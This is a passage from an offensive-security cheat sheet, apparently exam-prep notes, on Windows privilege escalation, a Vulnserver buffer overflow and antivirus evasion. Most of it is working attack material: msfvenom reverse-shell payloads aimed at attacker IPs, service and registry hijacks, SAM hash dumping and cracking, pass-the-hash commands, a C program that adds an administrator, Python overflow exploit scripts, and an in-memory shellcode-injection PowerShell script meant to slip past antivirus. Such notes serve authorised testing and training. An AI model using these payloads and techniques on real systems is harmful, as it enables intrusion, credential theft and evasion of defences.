   - Example: `SERVICE_START_NAME: LocalSystem`
4. Modify the service config and set the `BINARY_PATH_NAME` (binpath) to the reverse shell executable
   - `sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""`
5. Set a listener and start the service `net start <service>`

**Unquoted Service Path**

- `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
    1. Check which user is running it: `sc qc SERVICE_NAME`
    2. check it with a command similar to the following to see if you have write priv: `powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
- If you have found an Unquoted Service Path:
  - `Get-Acl -Path "C:\Program Files (x86)\service" | Format-List`
    - see if you have write privileges (with `icacls`)
  - `"service" | Get-ServiceACL | select -ExpandProperty Access`
    - see if you can stop and start (restart) the service
  - `msfvenom -p windows/shell_reverse_tcp LHOST=10.18.110.121 LPORT=445 -f exe -o shell.exe`
  - copy the `shell.exe`, then:
    1. `sc start "service"`
    2. `Stop-Service -name "service"`
    3. `Start-Service -name "service"`

Another way
1. Check: ["Microsoft Windows Unquoted Service Path Vulnerability"](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)
2. Query a service. If it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`) and the `BINARY_PATH_NAME` value is unquoted and contains spaces, it's possible a privilege escalation
   - `sc qc <service>`
   - Example: `BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Results\unquotedpathservice.exe`
   - You can also use the Powershell command `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
3. Use AccessChk to check write permissions in this directory `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
   - You can review the permissions with `icacls "C:\"` and `icacls "C:\Program Files\Enterprise Apps"`
   - Check if you can run and stop the service with `Start-Service GammaService` and `Stop-Service`
4. Copy the reverse shell `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
5. Start a listener on the attacker machine and run the service

**Weak Registry Permissions**
1. Query a service. Check if it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`)
   - `sc qc <service>`
2. Use AccessChk to check the write permissions of the registry entry for the service
   - note: `NT AUTHORITY\INTERACTIVE` group means all logged-on users
   - `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>`
3. Overwrite the ImagePath registry key to point to the reverse shell executable: `reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
4. Start a listener on the attacker machine and run the service

**DLL Hijacking**
- See: [DLL Hijacking](#dll-hijacking)

#### <ins>CVEs</ins>

- Check if `CVE-2018-8120` works
- See programs in `Program Files` and `(x86)` and search for CVEs
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- Note: Hotfix means patches, if you see N/A means that nothing has been patches
- See if you can connect as RDP to more easily find other vulnerable installed applications

**Run**
- `python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only`
- `python windows-exploit-suggester.py --database 2023-09-12-mssb.xls --systeminfo systeminfo.txt`
- if you can't use `systeminfo`, try `wmic qfe list full` and save it as `systeminfo.txt`
- `searchsploit Windows Server 2012 Privilege`

**Windows Server 2008**
- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

**CVE-2018-8440**
- If you see Hotfix N/A + write priv in `C:\Windows\tasks`
  - run to see if you have write priv: `icacls C:\Windows\Tasks`
- Try to run `/home/kali/Documents/windows-attack/CVE/CVE-2018-8440/Release/poc.exe`

**See the version of an exe**
- `Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force`

**Compile exploits**
- `cl 42020.cpp /EHsc /DUNICODE /D_UNICODE`
- `gcc -o output.c input.c`
- `gcc -m32 -o output.c input.c`
- `g++ your_program.cpp -o your_program`
- `i686-w64-gcc adduser.c -o adduser.exe`
- `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
- `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
- `mcs Wrapper.cs`

#### <ins>User Account Control (UAC)</ins>

Example:
- Even if we are logged in as an administrative user, we must move to a high integrity level in order to change the admin user's password.
- To do it, run the following commands
  ```PowerShell
  <# spawn a cmd.exe process with high integrity #>
  powershell.exe Start-Process cmd.exe -Verb runAs
  
  <# successfully changing the password of the admin user after spawning cmd.exe with high integrity #>
  whoami /groups
  net user admin Ev!lpass
  ```
  
UAC Bypass with `fodhelper.exe`, a Microsoft support application responsible for managing language changes in the operating system. Runs as high integrity on `Windows 10 1709`
- "[First entry: Welcome and fileless UAC bypass](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)"
- "[UAC Bypass – Fodhelper](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)"
- `REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f`


#### <ins>Insecure File Permissions</ins>

Also called "Service Binary Hijacking". Exploit insecure file permissions on services that run as nt authority\system
1. List running services on Windows using PowerShell `Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
2. Enumerate the permissions on the target service `icacls "C:\Program Files\Serviio\bin\ServiioService.exe"`
   - For this scenario, any user (BUILTIN\Users) on the system has full read and write access to it
   - See also "[Serviio PRO 1.8 DLNA Media Streaming Server - Local Privilege Escalation](https://www.exploit-db.com/exploits/41959)"
3. Substitute `ServiioService.exe` with the following
   ```C
   #include <stdlib.h>
   int main () {
     int i;
     i = system ("net user [username] [password] /add");
     i = system ("net localgroup administrators [username] /add");
     return 0;
   }
   ```
   - `i686-w64-gcc adduser.c -o adduser.exe` or `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe` to Cross-Compile the C Code to a 64-bit application
   - `move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program Files\Serviio\bin\ServiioService_original.exe"`
   - `move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"`
   - `dir "C:\Program Files\Serviio\bin\"`
4. Restart the service, here's two options
   - `net stop Serviio`
   - `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'Serviio'}` Obtain Startup Type for Serviio service
   - Check `Startmode` of the service with `wmic service where caption="Serviio" get name, caption, state, startmode`
   - If it's `Auto`, it means that it will restart after a reboot. Reboot with `shutdown /r /t 0 `.
5. Check if it worked with `net localgroup Administrators`

**PowerUp.ps1**
1. Check [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) and make it available with `python3 -m http.server 80`
2. Download it from the victim machine `iwr -uri http://<IP>/PowerUp.ps1 -Outfile PowerUp.ps1`
3. Run the commands `powershell -ep bypass` and `. .\PowerUp.ps1`
4. Then run `Get-ModifiableServiceFile` to display services the current user can modify
5. Run `Install-ServiceBinary -Name 'mysql'`. If it throws an error even if you already know that the current user has full access permissions on the service binary, proceed with manual exploitation


#### <ins>Registry</ins>

**AutoRuns**
1. Query the registry for AutoRun executables: `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
2. Use AccessChk to check write permissions of the executables `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\<program>.exe"`
3. Overwrite the reverse shell executables in the `<program>` path: `copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y`
4. Start a listener on the attacker machine. A new session on the victim machine will trigger a reverse shell running with admin privileges

**AlwaysInstallElevated**
1. Query the registry for AlwaysInstallElevated keys: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
   - Note if both keys are set to 1 (`0x1`)
2. Generate a reverse shell installer `.msi` with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi`
3. Transfer the installer `.msi` to the Windows machine
4. Start a listener on the attacker machine and then run the installer to trigger a reverse shell running with SYSTEM privileges: `msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

#### <ins>Passwords</ins>

**Registry**
1. Search for keys and values that contain the word "password"
   - `reg query HKLM /f password /t REG_SZ /s`
   - `reg query HKCU /f password /t REG_SZ /s`
2. If you have found an admin and its password, use [winexe](https://www.kali.org/tools/winexe/) command from the attacker machine to spawn a command prompt running with the admin privileges `winexe -U 'admin%password' //<IP> cmd.exe`

**Saved Credentials**
1. Check for any saved credentials `cmdkey /list`
2. Start a listener on the attacker machine and run the reverse shell executable using `runas` with the admin user's saved credentials: `runas /savecred /user:admin C:\PrivEsc\reverse.exe` or `runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"`

**Search for Configuration Files**
1. Run the commands: `dir /s *pass* == *.config` and `findstr /si password *.xml *.ini *.txt`
2. Use winPEAS to search for common files which may contain credentials: `.\winPEASany.exe quiet cmd searchfast filesinfo`
   - also run `.\winPEASx64.exe windowscreds filesinfo fileanalysis searchpf log=winpeas_out.txt`

**Security Account Manager (SAM)**
1. The `SAM` and `SYSTEM` files can be used to extract user password hashes. Check also backups of these files
   - `copy C:\Windows\Repair\SAM \\<IP>\kali\`
   - `copy C:\Windows\Repair\SYSTEM \\<IP>\kali\`
2. Dump the hashes with "creddump7": `python3 creddump7/pwdump.py SYSTEM SAM`
3. Crack the hashes with `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`

**Passing The Hash**
1. Use the hashes to authenticate: `pth-winexe -U 'admin%hash' //<IP Victim> cmd.exe`

#### <ins>Scheduled Tasks</ins>

1. List all scheduled tasks your user can see:
   - `schtasks /query /fo LIST /v`
   - In PowerShell: `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
2. Search in Task Manager for any scheduled task
   1. See if you find any `.ps1` script.
      - If the script found run as `SYSTEM`, check the write permissions of it with `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\<script>.ps1`
      - Add to it a line to run the reverse shell `echo C:\PrivEsc\reverse.exe >> C:\<script>.ps1`
   2. For the `.exe`, review the permissions with `icals C:\Users\Documents\service.exe`
      - If you have full access permissions, substitute the `.exe` as in the section [Insecure File Permissions](#insecure-file-permissions)


#### <ins>Insecure GUI Apps</ins>
1. Open an app. Look at the privilege level it runs with `tasklist /V | findstr mspaint.exe`
2. If the app runs with admin privileges and gives the possibility to open a file dialog box, click in the navigation input and paste: `file://c:/windows/system32/cmd.exe`

#### <ins>Startup Apps</ins>
1. Note if `BUILTIN\Users` group can write files to the StartUp directory: `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
2. Using cscript, run the following script to create a new shortcut of the reverse shell executable in the StartUp directory:
   - ```VBScript
     Set oWS = WScript.CreateObject("WScript.Shell")
     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
     Set oLink = oWS.CreateShortcut(sLinkFile)
     oLink.TargetPath = "C:\PrivEsc\reverse.exe"
     oLink.Save
     ```

#### <ins>Installed Applications</ins>
1. Manually enumerate all running programs: `tasklist /v`
   - With seatbelt: `.\seatbelt.exe NonstandardProcesses`
   - With winPEAS: `.\winPEASany.exe quiet procesinfo`
2. Search for the applications' versions
   - Try running the executable with `/?` or `-h,` as well as checking config or text files in the `Program Files` directory
3. Use Exploit-DB to search for a corresponding exploit

#### <ins>Hot Potato</ins>
Note: This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.
1. See [Hot Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#hotPotato), get the exploit [here](https://github.com/foxglovesec/Potato)
2. Start a listener on the attacker machine
3. Run the exploit: `.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true`
4. Wait for a Windows Defender update (or trigger one manually)

#### <ins>Token Impersonation</ins>


**[RoguePotato](https://github.com/antonioCoco/RoguePotato)**
1. See [Rogue Potato](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#roguePotato)
2. Set up a socat redirector on the attacker machine, forwarding its port 135 to port 9999 on Windows `sudo socat tcp-listen:135,reuseaddr,fork tcp:<Windows IP>:9999`
3. Execute the PoC: `.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999`
4. Check [Juicy Potato](https://github.com/ohpe/juicy-potato), it's an improved version

**More Potatoes**
- See: [Potatoes - Windows Privilege Escalation](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)

**[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)**
- Usage 1
  1. Copy `PSExec64.exe` and the `PrintSpoofer.exe` exploit executable over the Windows machine
  2. Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account: `C:\PrivEsc\PSExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse.exe`
  3. Run the PrintSpoofer exploit to trigger a reverse shell running with SYSTEM privileges: `C:\PrivEsc\PrintSpoofer.exe –i -c "C:\PrivEsc\reverse.exe"`
- Usage 2
  1. Copy the `PrintSpoofer.exe` exploit executable over the Windows machine
  2. `.\PrintSpoofer64.exe -i -c powershell.exe`

**metasploit**
- msfconsole, meterpreter > load incognito
  - `list_tokens -u`
  - `impersonate_token domain\\username`
  - `rev2self <# to reverte to initial user, usefull when the initial user is the admin #>`

#### <ins>getsystem</ins>
- **Access Tokens**: When a user first logs in, this object is created and linked to their active session. A copy of the user's principal access token is added to the new process when they launch it.
- **Impersonation Access Token**: When a process or thread momentarily needs to run with another user's security context, this object is created.
- **Token Duplication**: Windows permits processes and threads to use multiple access tokens. This allows for the duplication of an impersonation access token into a main access token. If we have the ability to inject into a process, we can leverage this feature to copy the process's access token and launch a new process with the same rights.
- **Documentation**: [Meterpreter getsystem | Metasploit Documentation](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)

#### <ins>Pass The Hash</ins>
- You can pass NTLM hashes, not NTLMv2
- `pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd`
- `crackmapexec smb 10.0.3.0/24 -u fcastle -H eb7126ae2c91ed5637hdn3hegve38928398 --local-auth`
- `crackmapexec winrm 192.168.174.175 -u usernames.txt -H hashes.txt --local-auth`
- `evil-winrm -i 192.168.174.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808`
- `impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> <USERNAME>:@<IP>`
- `impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175`
- with sam hashes, remember to use the correct pair
- https://labs.withsecure.com/publications/pth-attacks-against-ntlm-authenticated-web-applications


#### <ins>Pass The Password</ins>
- `crackmapexec smb 10.0.3.0/24 -u fcastle -d DOMAIN -p Password1`
- `crackmapexec smb 192.168.220.240 -u 'guest' -p ''`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --shares`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --sam`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --lsa`
- `crackmapexec smb 192.168.220.240 -u '' -p '' --ntds`


#### <ins>Apache lateral movement</ins>
- If you have logged in with an user, and you see the apache user, you might try to move laterally and from that user try to escalate
- check if you have write access to 'C:\xampp\htdocs' with `echo testwrite > testdoc.txt`
- if you have write privileges, download a cmd.php shell and check who the user is. If it's apache, do a reverse shell


#### <ins>Read data stream</ins>

maybe you are in a directory where there is something strange

1. use `dir /r`
   you might find files like the following
   ```
   hm.txt
   hm.txt:root.txt:$DATA
   ```
2. Use the following command
   `powershell Get-Content -Path "hm.txt" -Stream "root.txt"`
- See Hack The Box - Jeeves


#### <ins>PrintNightmare</ins>
- `impacket-rpcdump @10.10.108.190 | egrep 'MS-RPRN|MS-PAR'`. See: https://github.com/cube0x0/CVE-2021-1675#scanning
    1. `msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.18.110.121 LPORT=447 -f dll > shell.dll`
    2. `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
    4. Set a listener: `msfconsole -q`, `use multi/handler`
    3. `python3 '/home/kali/Documents/windows-attack/CVE/PrintNightmare/CVE-2021-1675/CVE-2021-1675.py' VULNNET/enterprise-security:'sand_0873959498'@10.10.198.52 '\\10.18.110.121\share\shell.dll'`
  - For just a Priv Esc, use https://github.com/calebstewart/CVE-2021-1675
- See: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare


#### <ins>Bypass CLM / CLM breakout | CLM / AppLocker Break Out</ins>
- Verify that you are in a contained enviorment with
  - `$executioncontext.sessionstate.languagemode`
  - `Get-AppLockerPolicy -Effective -XML`
  - see https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- https://github.com/padovah4ck/PSByPassCLM
- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
- reverse shell: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe`
- Msbuild: https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
           https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html


#### <ins>From Local Admin to System</ins>
- If you are part of the group "Administrators", try: `.\PsExec.exe -i -s -d -accepteula cmd`


#### <ins>TeamViewer</ins>
- TeamViewer 7 vulnerable to CVE-2019-18988
  - https://whynotsecurity.com/blog/teamviewer/
  - use post/windows/gather/credentials/teamviewer_passwords


#### <ins>Exploiting service through Symbolic Links</ins>
A symbolic link is a file object that points to another file object. The object being pointed to is called the target.
- create a Mount Point: `./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"`
  - In this way, a script that copies `request.log` will copy `id_rsa` instead
  - see proving-grounds/Symbolic


#### <ins>Write privileges</ins>

- If you can write on `C:\Windows\System32\`, try these:
  - https://github.com/sailay1996/WerTrigger
  - https://github.com/binderlabs/DirCreate2System



#### <ins>Services running - Autorun</ins>

- Usa tasklist: `tasklist /svc`
- `netstat -ano`
- See non-default services running
  - `wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
  - note: if in "PathName" you don't see quotation, there might be a Priv Esc
- See if there are any autorun applications outside the normal paths (like `C:\app`)
  - `wmic service get name,displayname,pathname,startmode |findstr /i "auto"`
  - See CVEs for privilege escalation
  - If there is an insecure folder permission, you could delete the exe that starts and replace it.
    - Check it with: `sc qc SERVICENAME`
  - once done, run `shutdown /r`
- To see the values corresponding to a PID: `tasklist /svc /FI "PID eq 9833"`
- Other ways to see running services: `Get-Service, wmic.exe, service get name, sc.exe query state= all, net.exe stat, Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE`



#### <ins>CEF Debugging Background</ins>
- Example: `Directory: C:\Program Files (x86)\Microsoft Visual Studio 10.0\Common7`
- https://github.com/taviso/cefdebug
-  https://twitter.com/taviso/status/1182418347759030272
- See the process: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html#priv-tushikikatomo--cyork



### <ins>Buffer Overflow</ins>

**Tools**
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/) + [mona](https://github.com/corelan/mona)
- [Vulnserver](https://thegreycorner.com/vulnserver.html)
  - Note: usually, `<port vulnserver>` is `9999`
- [Kali](https://www.kali.org/)
- See also [Buffer Overflows Made Easy | The Cyber Mentor](https://www.youtube.com/playlist?list=PLLKT__MCUeix3O0DPbmuaRuR_4Hxo4m3G)
- [mingw-w64](https://www.mingw-w64.org/), a cross-compiler for programs written to be compiled in Windows. With it you can compile them in an OS like Linux
  - Example of usage: `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
- See also: [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep)

**Issues**
- ["Problems attach Immunity to Vulnserver on Windows 10"](https://www.reddit.com/r/hacking/comments/ohg5t0/problems_attach_immunity_to_vulnserver_on_windows/): Don't start vulnserver, start Immunity as Admin, File > Open > vulnserver.exe, push "play".

**Steps to conduct a Buffer Overflow**
1. [Spiking](#spiking)
2. [Fuzzing](#fuzzing)
3. [Finding the Offset](#finding-the-offset)
4. [Overwriting the EIP](#overwriting-the-eip)
5. [Finding bad characters](#finding-bad-characters)
6. [Finding the right module](#finding-the-right-module)
7. [Generating Shellcode](#generating-shellcode)

#### <ins>Spiking</ins>

`generic_send_tcp <IP Vulnserver> <port vulnserver> script.spk 0 0`

**Example: trun.spk**
```spike
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

#### <ins>Fuzzing</ins>

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('<IP Vulnserver>', <port vulnserver>))
        s.send(('TRUN /.:/' + buffer).encode())
        s.close()
        sleep(1)
        buffer += "A" * 100
    except:
        print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
```

#### <ins>Finding the Offset</ins>

1. Get the result from: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes_where_server_crashed>`
2. Modify the previous script in
   ```python
   #!/usr/bin/python3
   import sys, socket
   from time import sleep
   
   offset = "RESULT_FROM_STEP_1"
   
   while True:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect(('<IP Vulnserver>', <port vulnserver>))
           s.send(('TRUN /.:/' + offset).encode())
           s.close()
       except:
           print ("Error connecting to the server")
           sys.exit()
   ```
3. After running the script, read the value from the EIP
4. With that value, run this script: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP_VALUE_STEP_2`

#### <ins>Overwriting the EIP</ins>

From the previous result, we should get the position `2003` for the start of the EIP. We can test this by sending `A * 2003` plus `B * 4` and see if `EIP = 42424242` (since `42424242` = `BBBB`).

```python
#!/usr/bin/python3
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<IP Vulnserver>', <port vulnserver>))
		s.send(('TRUN /.:/' + shellcode).encode())
		s.close()
	except:
		print ("Error connecting to the server")
		sys.exit()
```

#### <ins>Finding bad characters</ins>

You can generate a string of bad chars with the following python script
```Python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

The following python script is used to find bad chars
```python
#!/usr/bin/python3
import sys, socket
from time import sleep

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('<IP Vulnserver>', <port vulnserver>))
		s.send(('TRUN /.:/' + shellcode))
		s.close()
	except:
		print "Error connecting to the server"
		sys.exit()
```

1. After starting the script, once vulnserver breaks down, go in Immunity `Debugger` > `Registers` > Right-click on `ESP` > `Follow in Dump` > See `Hex dump`. 
2. Check if the Hex dump makes sence, e.g. in the Hex dump there is no number value missing.
   - Example: you may get a result like `... 01 02 03 B0 B0 06 07 08 ...`. As you can see, `04` and `05` are missing, so you've found a bad character.
3. Write down every character missing

Another solution to the step `3.`, with mona and Immunity Debugger
1. Set the working directory with `!mona config -set workingfolder c:\mona`
2. Generate bad characters with `!mona bytearray -cpb "\x00"` from Immunity Debugger
   -  Notice the new files in `c:\mona`
3. Run the python script of this section
4. Execute the command `!mona compare -f c:\mona\bytearray.bin -a <address of ESP>`
- Note: this may cause false positive

#### <ins>Finding the right module</ins>

Note: `JMP ESP` will be used as the pointer to jump to the shellcode. With `nasm_shell.rb` we can get the hex equivalent to these commands.
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

On Immunity, using mona, type
1. `!mona modules` to get the module to use, one with no memory protection for vulneserver. In this case, `essfunc.dll`.
2. `!mona jmp -r ESP -m "essfunc.dll"` to find the jump address
3. See the entries in `[+] Results:`

#### <ins>Generating Shellcode</ins>

1. Copy the result from `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
   - Always note the payload size
   - `-b` is for the badchars identified
2. See the following script
   ```python
   #!/usr/bin/python3
   import sys, socket
   from time import sleep
   
   overflow = () # HERE INSERT THE RESULT FROM THE STEP 1, THE VALUE IN `unsigned char buf[]`
                 # Before every line insert `b`, this will say to bytencode the string
   
   shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow
   
   while True:
   	try:
   		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   		s.connect(('<IP Vulnserver>', <port vulnserver>))
   		s.send((b'TRUN /.:/' + shellcode))
   		s.close()
   	except:
   		print ("Error connecting to the server")
   		sys.exit()
   ```
   - "\xaf\x11\x50\x62" is the jump address found for this example `625011af` in reverse
   - `shellcode` also contains `"\x90" * 32`. Those are NOPs, some padding to make sure that our code gets executed.
3. Use the command `nc -nvlp 4444`
4. Run the script, notice the shell in netcat


## Antivirus Evasion

- With powershell, use `-e` or `-enc` with an encoded command in base64
- See more here: [Section 14: Antivirus Bypassing](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-14-antivirus-bypassing)
- Try not running exe on disk, for example `cmd /c \\192.168.45.182\Share\nc.exe -i cmd.exe 192.168.45.182 448`

### <ins>ToDo</ins>
- Discover the AV in the machine of the victim
- Create a VM that resembles the victim's machine
- Make sure to disable sample submission 
  - `Windows Security` > `Virus & threat protection` > `Manage Settings` > `Automatic Sample Submission`
- As last resort, check the malware created with
  - [VirusTotal](https://www.virustotal.com/)
  - [AntiScan.Me](https://antiscan.me/)

### <ins>With Evil-WinRM</ins>
1. `*Evil-WinRM* PS C:\programdata> menu`
2. `*Evil-WinRM* PS C:\programdata> Bypass-4MSI`

### <ins>Thread Injection</ins>

1. Write this In-memory payload injection PowerShell `.ps1` script, from [PEN-200](https://www.offsec.com/courses/pen-200/)
   ```PowerShell
   <# Importing Windows APIs in PowerShell #>
   $code = '
   [DllImport("kernel32.dll")]
   public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
   [DllImport("kernel32.dll")]
   public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
   [DllImport("msvcrt.dll")]
   public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
  
   <# Memory allocation and payload writing using Windows APIs in PowerShell #>
   $var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
   [Byte[]];
   [Byte[]] $var1 = <SHELLCODE-HERE>;
   $size = 0x1000;
   if ($var1.Length -gt 0x1000) {$size =  $var1.Length};
   $x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
   for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
   
   <# Calling the payload using CreateThread #>
   $var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
   ```
  
2. Generate a PowerShell compatible payload
   - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f powershell`
3. Insert the result in `[Byte[]] $var1` in the PowerShell Script
4. Change the ExecutionPolicy for current user
   ```PowerShell
   PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
   PS C:\> Get-ExecutionPolicy -Scope CurrentUser
   ```
5. Set up a handler to interact with the meterpreter shell
     ```PowerShell
